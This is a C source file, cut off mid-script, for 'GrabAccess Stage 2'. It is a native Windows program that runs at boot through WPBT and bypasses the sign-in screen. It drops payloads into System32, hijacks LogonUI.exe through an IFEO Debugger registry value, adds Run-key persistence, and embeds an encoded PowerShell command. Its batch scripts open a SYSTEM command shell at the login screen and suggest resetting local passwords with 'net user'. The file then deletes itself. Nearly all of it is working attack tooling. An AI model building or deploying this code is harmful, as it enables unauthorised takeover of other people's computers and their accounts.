/************************************** INFO ***********************************
* File Name          : native.c
* Author             : PushEAX
* Version            : V1.3
* Date               : 2023-11-09
* Last Modified      : 2026-06-24
* Description        : GrabAccess Stage 2 - Native NT Application
*
*                      Executed by WPBT (Windows Platform Binary Table) during
*                      early boot. smss.exe extracts this binary to Wpbbin.exe
*                      and runs it before any user-mode services start.
*
*                      This program reads embedded payloads from its own binary,
*                      installs a user payload or sets up the LogonUI IFEO
*                      helper path.
*
* Execution Flow (inside NtProcessStartup):
*   Step 1: Read self (Wpbbin.exe) into memory
*   Step 2: Read package footer to locate embedded payloads
*   Step 3: If a user payload is bundled, install it and skip login helper
*   Step 4: Otherwise extract Injector + DLL and set LogonUI IFEO helper
*   Step 5: Self-delete Wpbbin.exe (FILE_DELETE_ON_CLOSE)
*******************************************************************************/

#include "ntddk.h"
#include "stdio.h"
#include "native.h"


/* ============================================================================
 * Configuration
 * ============================================================================ */

/* Set to 1 to enable diagnostic logging to C:\Windows\System32\ga_status.txt.
 * Each key decision point writes a line for post-mortem analysis.
 * Set to 0 for production builds (no log file is created). */
#define GA_DEBUG 1

/* Account/provider constants used by DetectLogonPlan(). */
#define ACCOUNT_TYPE_LOCAL    0
#define ACCOUNT_TYPE_MSA      1
#define ACCOUNT_TYPE_AD       2
#define ACCOUNT_TYPE_UNKNOWN  3

#define PROVIDER_TYPE_PASSWORD     0
#define PROVIDER_TYPE_PIN          1
#define PROVIDER_TYPE_PICTURE      2
#define PROVIDER_TYPE_FACE         3
#define PROVIDER_TYPE_FINGERPRINT  4
#define PROVIDER_TYPE_OTHER        5
#define PROVIDER_TYPE_UNKNOWN      6

#define LOGON_PLAN_AUTO_PATCH      0
#define LOGON_PLAN_FALLBACK_SHELL  1

#define FALLBACK_REASON_NONE                  0
#define FALLBACK_REASON_PROTECTED_LSASS       1
#define FALLBACK_REASON_NON_LOCAL_ACCOUNT     2
#define FALLBACK_REASON_UNSUPPORTED_PROVIDER  3
#define FALLBACK_REASON_UNKNOWN               4

/* New package format footer.
 * Unsigned bytes on disk: base exe | payload0 | payload1 | payload2 | footer.
 * If Authenticode signing runs after packing, signtool appends a
 * WIN_CERTIFICATE table after the footer. In that case the footer lives
 * immediately before the PE security directory instead of at physical EOF.
 * Payload discovery must never scan arbitrary binary data for marker bytes. */
#define GA_PACKAGE_MAGIC   ((ULONGLONG)0x21314B4341504147ui64) /* "GAPACK1!" */
#define GA_PACKAGE_VERSION 1
#define GA_MAX_PAYLOADS    4

#define GA_DOS_SIGNATURE                0x5A4D      /* MZ */
#define GA_NT_SIGNATURE                 0x00004550  /* PE\0\0 */
#define GA_PE32_MAGIC                   0x010B
#define GA_PE64_MAGIC                   0x020B
#define GA_DIRECTORY_ENTRY_SECURITY     4

typedef struct _GA_PACKAGE_FOOTER {
    ULONGLONG magic;
    ULONG version;
    ULONG footerSize;
    ULONG count;
    ULONG reserved;
    ULONG offset[GA_MAX_PAYLOADS];
    ULONG size[GA_MAX_PAYLOADS];
} GA_PACKAGE_FOOTER;

/* Payload information extracted from the package footer or legacy marker scan. */
typedef struct _PAYLOAD_INFO {
    ULONG start[GA_MAX_PAYLOADS]; /* byte offset where each payload begins */
    ULONG size[GA_MAX_PAYLOADS];  /* byte size of each payload             */
    int   count;      /* number of payloads found (0..4)       */
} PAYLOAD_INFO;


/* ============================================================================
 * Constants: File Paths  (NT Native Object Manager format)
 * ============================================================================ */
static WCHAR g_selfPath[]    = L"\\??\\C:\\Windows\\System32\\Wpbbin.exe";
static WCHAR g_injectorPath[]= L"\\??\\C:\\Windows\\System32\\Injector.exe";
static WCHAR g_dllPath[]     = L"\\??\\C:\\Windows\\System32\\GrabAccessMsvpBypass.dll";
static WCHAR g_explorerHostPath[] = L"\\??\\C:\\Windows\\System32\\GrabAccessExplorerHost.exe";
static WCHAR g_fallbackPath[] = L"\\??\\C:\\Windows\\System32\\GrabAccessFallback.exe";
static WCHAR g_autorunPath[] = L"\\??\\C:\\Windows\\System32\\GrabAccess.exe";
static WCHAR g_batPath[]     = L"\\??\\C:\\Windows\\System32\\GrabAccessRestore.bat";
static WCHAR g_cleanupBatPath[] = L"\\??\\C:\\Windows\\System32\\GrabAccessCleanup.bat";
static WCHAR g_reasonPath[]  = L"\\??\\C:\\Windows\\System32\\GrabAccessReason.txt";
static WCHAR g_methodPath[]  = L"\\??\\C:\\Windows\\System32\\GrabAccessMethod.txt";
#if GA_DEBUG
static WCHAR g_logPath[]     = L"\\??\\C:\\Windows\\System32\\ga_status.txt";
#endif


/* ============================================================================
 * Constants: Registry Keys & Value Names
 * ============================================================================ */

/* -- Winlogon: account detection -- */
static WCHAR g_winlogonKey[]        = L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
static WCHAR g_defaultDomainName[]  = L"DefaultDomainName";
static WCHAR g_defaultUserName[]    = L"DefaultUserName";

/* -- IFEO (Image File Execution Options) -- */
static WCHAR g_ifeoLogonUIKey[] = L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LogonUI.exe";
static WCHAR g_ifeoDebugger[]   = L"Debugger";

/* -- LogonUI / Credential Providers -- */
static WCHAR g_logonUiKey[]             = L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI";
static WCHAR g_lastProviderName[]       = L"LastLoggedOnProvider";
static WCHAR g_lastLoggedOnSAMUserName[]= L"LastLoggedOnSAMUser";
static WCHAR g_lastLoggedOnUserName[]   = L"LastLoggedOnUser";
static WCHAR g_lastLoggedOnUserSidName[]= L"LastLoggedOnUserSID";
static WCHAR g_selectedUserSidName[]    = L"SelectedUserSID";
static WCHAR g_loggedOnSAMUserName[]    = L"LoggedOnSAMUser";
static WCHAR g_loggedOnUserName[]       = L"LoggedOnUser";
static WCHAR g_loggedOnUserSidName[]    = L"LoggedOnUserSID";
static WCHAR g_passwordProviderGuid[]   = L"{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}";
static WCHAR g_pinProviderGuid[]        = L"{D6886603-9D2F-4EB2-B667-1971041FA96B}";
static WCHAR g_faceProviderGuid[]       = L"{8AF662BF-65A0-4D0A-A540-A338A999D36F}";
static WCHAR g_fingerprintProviderGuid[]= L"{BEC09223-B018-416D-A0AC-523971B639F5}";
static WCHAR g_pictureProviderGuid[]    = L"{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}";

/* -- IdentityStore SID-bound account cache. Best-effort only. -- */
static WCHAR g_identityCachePrefix[]    = L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\IdentityStore\\Cache\\";
static WCHAR g_identityCacheSubKey[]    = L"\\IdentityCache";
static WCHAR g_identityNameUserName[]   = L"UserName";
static WCHAR g_identityNameAccountName[]= L"AccountName";
static WCHAR g_identityNameDisplayName[]= L"DisplayName";
static WCHAR g_identityNameProvider[]   = L"ProviderName";
static WCHAR g_identityNameProviderId[] = L"IdentityProvider";
static WCHAR g_identityNameEmail[]      = L"EmailAddress";
static WCHAR g_identityNameUpn[]        = L"UserPrincipalName";

/* -- Computer/account detection -- */
static WCHAR g_computerNameKey[]    = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName";
static WCHAR g_computerNameName[]   = L"ComputerName";
static WCHAR g_runAsPplKey[]        = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Lsa";
static WCHAR g_runAsPplName[]       = L"RunAsPPL";
static WCHAR g_runAsPplBootName[]   = L"RunAsPPLBoot";

/* -- Autorun (optional user payload persistence) -- */
static WCHAR g_autorunKey[]  = L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
static WCHAR g_autorunName[] = L"GrabAccessAutorun";
static WCHAR g_autorunData[] = L"C:\\Windows\\System32\\GrabAccess.exe";


/* ============================================================================
 * Constants: IFEO Commands
 * ============================================================================ */

/* IFEO launches the selected helper BAT. Winlogon appends the original LogonUI
 * command line, which the BAT can chain back to through %*. */
static WCHAR g_ifeoCmdLegacy[] =
    L"cmd.exe /c C:\\Windows\\System32\\GrabAccessRestore.bat";


/* ============================================================================
 * Constants: BAT Script Content
 * ============================================================================ */

/* Bilingual fallback console summary. Encoded to keep this source ASCII-only
 * while still printing Chinese text reliably after chcp 65001. */
#define GA_FALLBACK_INFO_CMD \
    "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand " \
    "JABlAD0AJwBTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACcAOwAkAEUAcgByAG8AcgBBAGMAdABpAG8AbgBQAHIAZQBmAGUAcgBlAG4AYwBlAD0AJABlADsAJABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQA9ACQAZQA7AGYAdQBuAGMAdABpAG8AbgAgAHcAKAAkAHgAKQB7AFsAQwBvAG4AcwBvAGwAZQBdADoAOgBXAHIAaQB0AGUATABpAG4AZQAoAFsAcwB0AHIAaQBuAGcAXQAkAHgAKQB9ADsAdAByAHkAewBbAEMAbwBuAHMAbwBsAGUAXQA6ADoATwB1AHQAcAB1AHQARQBuAGMAbwBkAGkAbgBnAD0AWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgAfQBjAGEAdABjAGgAewB9AAoAJAByAD0AZwBwACAAJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AXABMAG8AZwBvAG4AVQBJACcAIAAtAGUAYQAgADAACgAkAHMAPQAkAHIALgBTAGUAbABlAGMAdABlAGQAVQBzAGUAcgBTAEkARAA7AGkAZgAoACEAJABzACkAewAkAHMAPQAkAHIA" \
    "LgBMAGEAcwB0AEwAbwBnAGcAZQBkAE8AbgBVAHMAZQByAFMASQBEAH0AOwBpAGYAKAAhACQAcwApAHsAJABzAD0AJAByAC4ATABvAGcAZwBlAGQATwBuAFUAcwBlAHIAUwBJAEQAfQAKACQAdQA9ACQAcgAuAEwAYQBzAHQATABvAGcAZwBlAGQATwBuAFMAQQBNAFUAcwBlAHIAOwBpAGYAKAAhACQAdQApAHsAJAB1AD0AJAByAC4ATABhAHMAdABMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgB9ADsAaQBmACgAIQAkAHUAKQB7ACQAdQA9ACQAcgAuAEwAbwBnAGcAZQBkAE8AbgBTAEEATQBVAHMAZQByAH0AOwBpAGYAKAAhACQAdQApAHsAJAB1AD0AJAByAC4ATABvAGcAZwBlAGQATwBuAFUAcwBlAHIAfQA7AGkAZgAoACEAJAB1ACkAewAkAHUAPQAnAFUAbgBrAG4AbwB3AG4AJwB9AAoAJABnAD0AWwBzAHQAcgBpAG4AZwBdACQAcgAuAEwAYQBzAHQATABvAGcAZwBlAGQATwBuAFAAcgBvAHYAaQBkAGUAcgA7ACQAcAA9AHMAdwBpAHQAYwBoACAALQBSAGUAZwBlAHgAKAAkAGcAKQB7ACcANgAwAGIANwA4AGUAOAA4ACcAewAnAMZbAXgnAH0AJwBEADYAOAA4ADYANgAwADMAJwB7ACcAUABJAE4AJwB9ACcAMgAxADMANQBmADcAMgBhACcAewAnAP5WR3LGWwF4JwB9ACcA" \
    "OABBAEYANgA2ADIAQgBGACcAewAnALpOOIEnAH0AJwBCAEUAQwAwADkAMgAyADMAJwB7ACcAB2O5ficAfQBkAGUAZgBhAHUAbAB0AHsAaQBmACgAJABnACkAewAnAHZRg1snAH0AZQBsAHMAZQB7ACcAKmfldycAfQB9AH0ACgAkAHAAZQA9AHMAdwBpAHQAYwBoACAALQBSAGUAZwBlAHgAKAAkAGcAKQB7ACcANgAwAGIANwA4AGUAOAA4ACcAewAnAFAAYQBzAHMAdwBvAHIAZAAnAH0AJwBEADYAOAA4ADYANgAwADMAJwB7ACcAUABJAE4AJwB9ACcAMgAxADMANQBmADcAMgBhACcAewAnAFAAaQBjAHQAdQByAGUAIABwAGEAcwBzAHcAbwByAGQAJwB9ACcAOABBAEYANgA2ADIAQgBGACcAewAnAEYAYQBjAGUAJwB9ACcAQgBFAEMAMAA5ADIAMgAzACcAewAnAEYAaQBuAGcAZQByAHAAcgBpAG4AdAAnAH0AZABlAGYAYQB1AGwAdAB7AGkAZgAoACQAZwApAHsAJwBPAHQAaABlAHIAJwB9AGUAbABzAGUAewAnAFUAbgBrAG4AbwB3AG4AJwB9AH0AfQAKACQAcwByAGMAPQAnAFUAbgBrAG4AbwB3AG4AJwA7AGkAZgAoACQAcwApAHsAdAByAHkAewAkAGwAdQA9AEcAZQB0AC0ATABvAGMAYQBsAFUAcwBlAHIAIAAtAFMASQBEACAAJABzACAALQBlAGEAIABTAHQAbwBwADsA" \
    "aQBmACgAJABsAHUALgBQAHIAaQBuAGMAaQBwAGEAbABTAG8AdQByAGMAZQApAHsAJABzAHIAYwA9AFsAcwB0AHIAaQBuAGcAXQAkAGwAdQAuAFAAcgBpAG4AYwBpAHAAYQBsAFMAbwB1AHIAYwBlAH0AfQBjAGEAdABjAGgAewB9AH0ACgBpAGYAKAAkAHMAcgBjACAALQBlAHEAIAAnAFUAbgBrAG4AbwB3AG4AJwApAHsAaQBmACgAJAB1ACAALQBtAGEAdABjAGgAIAAnAF4AQQB6AHUAcgBlAEEARABcAFwAJwApAHsAJABzAHIAYwA9ACcAQQB6AHUAcgBlAEEARAAnAH0AZQBsAHMAZQBpAGYAKAAkAHUAIAAtAG0AYQB0AGMAaAAgACcAXgBNAGkAYwByAG8AcwBvAGYAdABBAGMAYwBvAHUAbgB0AFwAXAAnACAALQBvAHIAIAAkAHUAIAAtAG0AYQB0AGMAaAAgACcAQAAnACkAewAkAHMAcgBjAD0AJwBNAGkAYwByAG8AcwBvAGYAdABBAGMAYwBvAHUAbgB0ACcAfQBlAGwAcwBlAGkAZgAoACQAdQAgAC0AbQBhAHQAYwBoACAAJwBeAFsAXgBcAFwAXQArAFwAXAAnACkAewAkAHAAcgBlAD0AJAB1AC4AUwBwAGwAaQB0ACgAJwBcAFwAJwApAFsAMABdADsAaQBmACgAJABwAHIAZQAgAC0AbgBlACAAJwAuACcAIAAtAGEAbgBkACAAJABwAHIAZQAgAC0AbgBlACAAJABlAG4A" \
    "dgA6AEMATwBNAFAAVQBUAEUAUgBOAEEATQBFACkAewAkAHMAcgBjAD0AJwBBAGMAdABpAHYAZQBEAGkAcgBlAGMAdABvAHIAeQAnAH0AfQB9AAoAJABzAGMAPQBzAHcAaQB0AGMAaAAoACQAcwByAGMAKQB7ACcATABvAGMAYQBsACcAewAnACxnMFcmjTdiJwB9ACcATQBpAGMAcgBvAHMAbwBmAHQAQQBjAGMAbwB1AG4AdAAnAHsAJwCuX2+PKFe/fiaNN2InAH0AJwBBAHoAdQByAGUAQQBEACcAewAnAE0AaQBjAHIAbwBzAG8AZgB0ACAARQBuAHQAcgBhACAASQBEACcAfQAnAEEAYwB0AGkAdgBlAEQAaQByAGUAYwB0AG8AcgB5ACcAewAnAEEARAAgAN9XJo03YicAfQBkAGUAZgBhAHUAbAB0AHsAJwAqZ+V3JwB9AH0ACgAkAHMAZQA9AHMAdwBpAHQAYwBoACgAJABzAHIAYwApAHsAJwBMAG8AYwBhAGwAJwB7ACcATABvAGMAYQBsACAAYQBjAGMAbwB1AG4AdAAnAH0AJwBNAGkAYwByAG8AcwBvAGYAdABBAGMAYwBvAHUAbgB0ACcAewAnAE0AaQBjAHIAbwBzAG8AZgB0ACAAYQBjAGMAbwB1AG4AdAAnAH0AJwBBAHoAdQByAGUAQQBEACcAewAnAE0AaQBjAHIAbwBzAG8AZgB0ACAARQBuAHQAcgBhACAASQBEACcAfQAnAEEAYwB0AGkAdgBlAEQAaQByAGUAYwB0AG8A" \
    "cgB5ACcAewAnAEEARAAgAGQAbwBtAGEAaQBuACAAYQBjAGMAbwB1AG4AdAAnAH0AZABlAGYAYQB1AGwAdAB7ACcAVQBuAGsAbgBvAHcAbgAnAH0AfQAKAHQAcgB5AHsAJABvAD0ARwBlAHQALQBMAG8AYwBhAGwAVQBzAGUAcgB8AHMAbwByAHQAIABOAGEAbQBlAHwAcwBlAGwAZQBjAHQAIABOAGEAbQBlACwARQBuAGEAYgBsAGUAZAAsAFAAcgBpAG4AYwBpAHAAYQBsAFMAbwB1AHIAYwBlAHwAZgB0ACAALQBhAHwAbwB1AHQALQBzAHQAcgBpAG4AZwAgAC0AdwAgADEAMQAwAH0AYwBhAHQAYwBoAHsAJABvAD0AYwBtAGQAIAAvAGMAIABuAGUAdAAgAHUAcwBlAHIAfQA7ACQAbABpAG4AZQBzAD0AJABvACAALQBzAHAAbABpAHQAIAAiAGAAcgA/AGAAbgAiAHwAPwB7ACQAXwB9AAoAdwAgACcAIAAgAD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9ACcAOwB3ACAAJwAgACAAIAAgAEcAcgBhAGIAQQBjAGMAZQBzAHMAIAB8ACAAU19NUnt2Rpa5ZQ9fDU7vU9V+x48M/0ZPYE/vU+VOKFdkawRZZ2JMiPtO" \
    "D2F9VOROJwA7AHcAIAAnACAAIAA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQAnADsAdwAgACgAJwAgACAAU19NUnt2VV+5ZQ9fOgAgACcAKwAkAHMAYwArACcAIAArACAAJwArACQAcAApADsAdwAgACcAIAAgACxnMFcodTdiF1JoiDoAJwA7ACQAbABpAG4AZQBzAHwAJQB7AHcAKAAnACAAIAAgACAAJwArACQAXwApAH0AOwB3ACAAJwAnADsAdwAgACcAIAAgAIJZnGdgTwCXgYnuTzllLGcwVyh1N2KEdsZbAXgM/+9T5U5nYkyIOgAnADsAdwAgACcAIAAgACAAIABuAGUAdAAgAHUAcwBlAHIAIAAiACh1N2INVCIAIAAiALBlxlsBeCIAJwA7AHcAIAAnACcAOwB3ACAAJwAgACAAk49lUSAAZQB4AGkAdAAgAHNR7ZVka5d641MCMCcAOwB3ACAAJwAnAAoAdwAgACcAIAAgAD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0A" \
    "PQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0AJwA7AHcAIAAnACAAIAAgACAARwByAGEAYgBBAGMAYwBlAHMAcwAgAHwAIABUAGgAaQBzACAAcwBpAGcAbgAtAGkAbgAgAG0AZQB0AGgAbwBkACAAYwBhAG4AbgBvAHQAIABiAGUAIABiAHkAcABhAHMAcwBlAGQALAAgAGIAdQB0ACAAeQBvAHUAIABjAGEAbgAgAHIAdQBuACAAYQBuAHkAIABjAG8AbQBtAGEAbgBkACAAaABlAHIAZQAnADsAdwAgACcAIAAgAD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0AJwA7AHcAIAAoACcAIAAgAEMAdQByAHIAZQBuAHQAIABzAGkAZwBuAC0AaQBuACAAbQBlAHQAaABvAGQAOgAgACcAKwAkAHMAZQArACcAIAArACAAJwArACQAcABlACkAOwB3ACAAJwAgACAATABvAGMAYQBsACAAdQBzAGUAcgBzADoAJwA7ACQAbABpAG4AZQBzAHwAJQB7AHcAKAAnACAAIAAgACAAJwArACQA" \
    "XwApAH0AOwB3ACAAJwAnADsAdwAgACcAIAAgAFQAbwAgAGMAaABhAG4AZwBlACAAYQAgAGwAbwBjAGEAbAAgAHUAcwBlAHIAIABwAGEAcwBzAHcAbwByAGQALAAgAHIAdQBuADoAJwA7AHcAIAAnACAAIAAgACAAbgBlAHQAIAB1AHMAZQByACAAIgBVAHMAZQByAG4AYQBtAGUAIgAgACIATgBlAHcAUABhAHMAcwB3AG8AcgBkACIAJwA7AHcAIAAnACcAOwB3ACAAJwAgACAAVAB5AHAAZQAgAGUAeABpAHQAIAB0AG8AIABjAGwAbwBzAGUAIAB0AGgAaQBzACAAdwBpAG4AZABvAHcALgAnADsAdwAgACcAJwA=\r\n"

/* Fast fallback console summary. Avoid PowerShell on the secure desktop because
 * PowerShell startup and Get-LocalUser can be very slow on Windows 11 cloud
 * account machines. Chinese text is UTF-8 byte escaped to keep this source
 * build-codepage independent. */
#define GA_FALLBACK_FAST_INFO_CMD \
    "echo(  =======================================================================\r\n" \
    "echo(    GrabAccess ^| \xE5\xBD\x93\xE5\x89\x8D\xE7\x99\xBB\xE5\xBD\x95\xE6\x96\xB9\xE5\xBC\x8F\xE4\xB8\x8D\xE5\x8F\xAF\xE7\xBB\x95\xE8\xBF\x87\xEF\xBC\x8C\xE4\xBD\x86\xE4\xBD\xA0\xE5\x8F\xAF\xE4\xBB\xA5\xE5\x9C\xA8\xE6\xAD\xA4\xE5\xA4\x84\xE6\x89\xA7\xE8\xA1\x8C\xE4\xBB\xBB\xE6\x84\x8F\xE5\x91\xBD\xE4\xBB\xA4\r\n" \
    "echo(  =======================================================================\r\n" \
    "echo(  \xE4\xB8\x8D\xE5\x8F\xAF\xE7\xBB\x95\xE8\xBF\x87\xE7\x9A\x84\xE5\x8E\x9F\xE5\x9B\xA0:\r\n" \
    "if exist \"%GA_DIR%\\GrabAccessReason.txt\" type \"%GA_DIR%\\GrabAccessReason.txt\"\r\n" \
    "if not exist \"%GA_DIR%\\GrabAccessReason.txt\" echo(  Reason: unavailable.\r\n" \
    "echo(\r\n" \
    "echo(  \xE6\x9C\xAC\xE5\x9C\xB0\xE7\x94\xA8\xE6\x88\xB7\xE5\x88\x97\xE8\xA1\xA8:\r\n" \
    "echo(    Name\r\n" \
    "echo(    ----\r\n" \
    "set \"GA_USER_LIST_OK=0\"\r\n" \
    "set \"GA_USER_SECTION=0\"\r\n" \
    "for /f \"tokens=1,2,3\" %%A in ('net user 2^>nul') do (\r\n" \
    "  call :ga_process_user_line \"%%A\" \"%%B\" \"%%C\"\r\n" \
    ")\r\n" \
    "if \"%GA_USER_LIST_OK%\"==\"0\" echo(    Cannot list local users.\r\n" \
    "echo(\r\n" \
    "echo(  \xE5\xA6\x82\xE6\x9E\x9C\xE4\xBD\xA0\xE9\x9C\x80\xE8\xA6\x81\xE4\xBF\xAE\xE6\x94\xB9\xE6\x9C\xAC\xE5\x9C\xB0\xE7\x94\xA8\xE6\x88\xB7\xE7\x9A\x84\xE5\xAF\x86\xE7\xA0\x81\xEF\xBC\x8C\xE5\x8F\xAF\xE4\xBB\xA5\xE6\x89\xA7\xE8\xA1\x8C:\r\n" \
    "echo(    net user \"\xE7\x94\xA8\xE6\x88\xB7\xE5\x90\x8D\" \"\xE6\x96\xB0\xE5\xAF\x86\xE7\xA0\x81\"\r\n" \
    "echo(\r\n" \
    "echo(  \xE8\xBE\x93\xE5\x85\xA5 exit \xE5\x85\xB3\xE9\x97\xAD\xE6\xAD\xA4\xE7\xAA\x97\xE5\x8F\xA3\xE3\x80\x82\r\n" \
    "echo(\r\n" \
    "echo(  ========================================================================================\r\n" \
    "echo(    GrabAccess ^| This sign-in method cannot be bypassed, but you can run any command here\r\n" \
    "echo(  ========================================================================================\r\n" \
    "echo(  Fallback reason:\r\n" \
    "if exist \"%GA_DIR%\\GrabAccessReason.txt\" type \"%GA_DIR%\\GrabAccessReason.txt\"\r\n" \
    "if not exist \"%GA_DIR%\\GrabAccessReason.txt\" echo(  Reason: unavailable.\r\n" \
    "echo(\r\n" \
    "echo(  Local users:\r\n" \
    "echo(    Name\r\n" \
    "echo(    ----\r\n" \
    "set \"GA_USER_LIST_OK=0\"\r\n" \
    "set \"GA_USER_SECTION=0\"\r\n" \
    "for /f \"tokens=1,2,3\" %%A in ('net user 2^>nul') do (\r\n" \
    "  call :ga_process_user_line \"%%A\" \"%%B\" \"%%C\"\r\n" \
    ")\r\n" \
    "if \"%GA_USER_LIST_OK%\"==\"0\" echo(    Cannot list local users.\r\n" \
    "echo(\r\n" \
    "echo(  To change a local user password, run:\r\n" \
    "echo(    net user \"Username\" \"NewPassword\"\r\n" \
    "echo(\r\n" \
    "echo(  Type exit to close this window.\r\n" \
    "echo(\r\n"

/* Give fallback cmd enough visible space and scrollback. On Windows 11 secure
 * desktop, true fullscreen console is not reliable; a large console buffer is
 * the important part because it restores scroll-up history when many local
 * users are listed. */
#define GA_FALLBACK_CONSOLE_MODE \
    "mode con: cols=120 lines=2000 > nul 2>&1\r\n"

#define GA_START_FALLBACK_CONSOLE \
    "if exist \"%SystemRoot%\\System32\\GrabAccessFallback.exe\" (\r\n" \
    "  echo [GA] Starting GrabAccessFallback.exe>>\"%GA_DIR%\\ga_status.txt\"\r\n" \
    "  start \"GrabAccess\" /d \"%SystemRoot%\\System32\" \"%SystemRoot%\\System32\\GrabAccessFallback.exe\"\r\n" \
    "  ping 127.0.0.1 -n 3 > nul\r\n" \
    "  tasklist /fi \"imagename eq GrabAccessFallback.exe\" 2>nul | find /i \"GrabAccessFallback.exe\" > nul\r\n" \
    "  if errorlevel 1 start \"GrabAccess\" /max cmd.exe /k\r\n" \
    ") else (\r\n" \
    "  echo [GA] GrabAccessFallback.exe missing; opening cmd fallback>>\"%GA_DIR%\\ga_status.txt\"\r\n" \
    "  start \"GrabAccess\" /max cmd.exe /k\r\n" \
    ")\r\n"

#define GA_SHOW_FALLBACK_CONSOLE \
    "cd /d %SystemRoot%\\System32\r\n" \
    "cmd.exe /k\r\n" \
    "start /b cmd /c \"ping 127.0.0.1 -n 3 > nul & C:\\Windows\\System32\\GrabAccessCleanup.bat\"\r\n" \
    "exit /b 0\r\n" \
    ":ga_process_user_line\r\n" \
    "if \"%~1\"==\"-------------------------------------------------------------------------------\" (\r\n" \
    "  set \"GA_USER_SECTION=1\"\r\n" \
    "  exit /b 0\r\n" \
    ")\r\n" \
    "if not \"%GA_USER_SECTION%\"==\"1\" exit /b 0\r\n" \
    "if /I \"%~1\"==\"The\" exit /b 0\r\n" \
    "if \"%~1\"==\"\xE5\x91\xBD\xE4\xBB\xA4\xE6\x88\x90\xE5\x8A\x9F\xE5\xAE\x8C\xE6\x88\x90\xE3\x80\x82\" exit /b 0\r\n" \
    "set \"GA_USER_TOKEN=%~1\"\r\n" \
    "call :ga_emit_user_token\r\n" \
    "set \"GA_USER_TOKEN=%~2\"\r\n" \
    "call :ga_emit_user_token\r\n" \
    "set \"GA_USER_TOKEN=%~3\"\r\n" \
    "call :ga_emit_user_token\r\n" \
    "exit /b 0\r\n" \
    ":ga_emit_user_token\r\n" \
    "if \"%GA_USER_TOKEN%\"==\"\" exit /b 0\r\n" \
    "if /I \"%GA_USER_TOKEN%\"==\"Administrator\" exit /b 0\r\n" \
    "if /I \"%GA_USER_TOKEN%\"==\"Guest\" exit /b 0\r\n" \
    "if /I \"%GA_USER_TOKEN%\"==\"DefaultAccount\" exit /b 0\r\n" \
    "if /I \"%GA_USER_TOKEN%\"==\"WDAGUtilityAccount\" exit /b 0\r\n" \
    "if /I \"%GA_USER_TOKEN%\"==\"defaultuser0\" exit /b 0\r\n" \
    "if \"%GA_USER_TOKEN%\"==\"\xE7\xAE\xA1\xE7\x90\x86\xE5\x91\x98\" exit /b 0\r\n" \
    "if \"%GA_USER_TOKEN%\"==\"\xE6\x9D\xA5\xE5\xAE\xBE\" exit /b 0\r\n" \
    "echo(    %GA_USER_TOKEN%\r\n" \
    "set \"GA_USER_LIST_OK=1\"\r\n" \
    "exit /b 0\r\n"

/* -- Cleanup script for no-payload helper mode --
 * Current no-payload mode does not change credential-provider state, so cleanup
 * only removes GrabAccess temporary helpers and IFEO state. */
static char g_batCleanupHelper[] =
    "@echo off\r\n"
    "set GA_DIR=C:\\Windows\\System32\r\n"
    "if /I \"%~1\"==\"postlogon\" goto ga_postlogon\r\n"
    "if /I \"%~1\"==\"postauth\" goto ga_postlogon\r\n"
    "goto ga_cleanup\r\n"
    ":ga_postlogon\r\n"
    "set GA_AUTH_WAIT=0\r\n"
    ":ga_wait_auth\r\n"
    "if exist \"%GA_DIR%\\GA_AuthSeen.flag\" goto ga_wait_desktop\r\n"
    "set /a GA_AUTH_WAIT+=1 > nul 2>&1\r\n"
    "if %GA_AUTH_WAIT% GEQ 900 exit /b 0\r\n"
    "ping 127.0.0.1 -n 2 > nul\r\n"
    "goto ga_wait_auth\r\n"
    ":ga_wait_desktop\r\n"
    "set GA_WAIT=0\r\n"
    ":ga_wait_explorer\r\n"
    "tasklist /fi \"imagename eq explorer.exe\" | find /i \"explorer.exe\" > nul 2>&1\r\n"
    "if not errorlevel 1 goto ga_desktop_ready\r\n"
    "set /a GA_WAIT+=1 > nul 2>&1\r\n"
    "if %GA_WAIT% GEQ 60 exit /b 0\r\n"
    "ping 127.0.0.1 -n 2 > nul\r\n"
    "goto ga_wait_explorer\r\n"
